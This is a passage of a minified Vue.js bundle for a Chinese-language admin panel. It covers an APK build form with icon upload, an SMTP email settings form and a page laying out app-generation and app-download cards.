    accept: ".png"
}, {
    default: a(() => [t(U, null, {
        default: a(() => [b("上传图标")]),
        _: 1
    })]),
    _: 1
}), m("div", {
    class: "zgl-field-tip"
}, "当前已选：" + (l.value.icoid || "未选择")), t(u, {
    wrap: ""
}, {
    default: a(() => [(f(!0), T(P, null, B(_.value, (n, H) => (f(), T("div", {
        key: H,
        class: "zgl-img-cell"
    }, [t(te, {
        src: we(n),
        width: "64",
        height: "64",
        onClick: Y => _e(n)
    }, null, 8, ["src", "onClick"]), t(U, {
        size: "small",
        type: "error",
        style: "position:absolute;top:2px;right:2px;padding:0;width:18px;height:18px;font-size:13px;color:#fff;background-color:rgba(214,69,69,0.85);border-radius:50%;line-height:16px;text-align:center;cursor:pointer",
        onClick: Y => ce(n)
    }, {
        default: a(() => [b("×")]),
        _: 2
    }, 1032, ["onClick"])]))), 128))]),
    _: 1
})])]),
                                    _: 1
                                }), t(xe, {
                                    span: 2
                                }, {
                                    default: a(() => [m("div", {
    class: "zgl-submit-bar"
}, [t(U, {
    type: "primary",
    size: "large",
    onClick: ye,
    style: "flex:1;height:46px;font-size:15px;font-weight:600;letter-spacing:6px"
}, {
    default: a(() => [b("生 成 应 用")]),
    _: 1
}), m("span", {
    class: "zgl-sec-tip"
}, "构建完成后，APK 会出现在右侧「应用下载」列表")])]),
                                    _: 1
                                })])
                            })])
                        }, 8, ["model"])]),
                        _: 1
                    })])
                })
            }
        }
    }),
    Xe = O({
        __name: "EmailSetting",
        setup(F) {
            const $ = {
                    originator: {
                        required: !0,
                        message: "请输入发件人邮箱",
                        trigger: "blur"
                    }
                },
                g = R(null),
                S = ie(),
                x = R({
                    originator: ""
                });

            function N() {
                g.value.validate(k => {
                    k ? S.error("验证失败，请填写完整信息") : S.success("验证成功")
                })
            }
            return (k, v) => {
                const w = ue,
                    i = pe,
                    r = Q,
                    p = W,
                    _ = de,
                    l = j,
                    M = V;
                return f(), C(M, {
                    cols: "2 s:2 m:2 l:3 xl:3 2xl:3",
                    responsive: "screen"
                }, {
                    default: a(() => [t(l, null, {
                        default: a(() => [t(_, {
                            "label-width": 120,
                            model: x.value,
                            rules: $,
                            ref_key: "formRef",
                            ref: g
                        }, {
                            default: a(() => [t(i, {
                                label: "发件人邮箱",
                                path: "originator"
                            }, {
                                default: a(() => [t(w, {
                                    value: x.value.originator,
                                    "onUpdate:value": v[0] || (v[0] = z => x.value.originator = z),
                                    placeholder: "请输入发件人邮箱"
                                }, null, 8, ["value"])]),
                                _: 1
                            }), t(i, {
                                label: "SMTP服务器地址"
                            }, {
                                default: a(() => [t(w, {
                                    placeholder: "请输入SMTP服务器地址"
                                })]),
                                _: 1
                            }), t(i, {
                                label: "SMTP服务器端口"
                            }, {
                                default: a(() => [t(w, {
                                    placeholder: "请输入SMTP服务器端口"
                                })]),
                                _: 1
                            }), t(i, {
                                label: "SMTP用户名"
                            }, {
                                default: a(() => [t(w, {
                                    placeholder: "请输入SMTP用户名"
                                })]),
                                _: 1
                            }), t(i, {
                                label: "SMTP密码"
                            }, {
                                default: a(() => [t(w, {
                                    type: "password",
                                    placeholder: "请输入SMTP密码"
                                })]),
                                _: 1
                            }), t(i, {
                                label: "邮件测试"
                            }, {
                                default: a(() => [t(r, null, {
                                    default: a(() => v[1] || (v[1] = [b("邮件测试")])),
                                    _: 1
                                })]),
                                _: 1
                            }), m("div", null, [t(p, null, {
                                default: a(() => [t(r, {
                                    type: "primary",
                                    onClick: N
                                }, {
                                    default: a(() => v[2] || (v[2] = [b("更新邮件信息")])),
                                    _: 1
                                })]),
                                _: 1
                            })])]),
                            _: 1
                        }, 8, ["model"])]),
                        _: 1
                    })]),
                    _: 1
                })
            }
        }
    }),
    He = O({
        __name: "system",
        setup(F) {
            const $ = [{
                    name: "应用下载",
                    desc: "下载",
                    key: 1
                }, {
                    name: "应用生成",
                    desc: "生成",
                    key: 2
                }],
                g = Me({
                    type: 2,
                    typeTitle: "APK构建"
                });

            function S(x) {
                g.type = x.key, g.typeTitle = x.name
            }
            return (x, N) => {
                const k = ze,
                    v = se,
                    w = j,
                    i = V;
                return f(), T("div", {
                    style: "display: flex; flex-direction: row; gap: 20px; align-items: flex-start;",
                    class: "app-list-wrap"
                }, [t(v, {
                    bordered: !1,
                    size: "small",
                    title: "应用生成",
                    class: Ne(["proCard", { "app-generate-tab": !0 }]),
                    style: "border-radius: 12px; flex: 1.3; min-width: 0;"
                }, {
                    default: a(() => [C(qe, {
                        key: 1
                    })]),
                    _: 1
                }, 8, ["title"]), t(v, {
                    bordered: !1,
                    size: "small",
                    title: "应用下载",
                    class: Ne(["proCard"]),
                    style: "border-radius: 12px; flex: 1; min-width: 0;"
                }, {
                    default: a(() => [C(Ve, {
                        key: 0
                    })]),
                    _: 1
                }, 8, ["title"])])
            }
        }
    }),
    Ge = Ae(He, [
        ["__scopeId", "data-v-9a915ab9"]
    ]);
export {
    Ge as
    default
};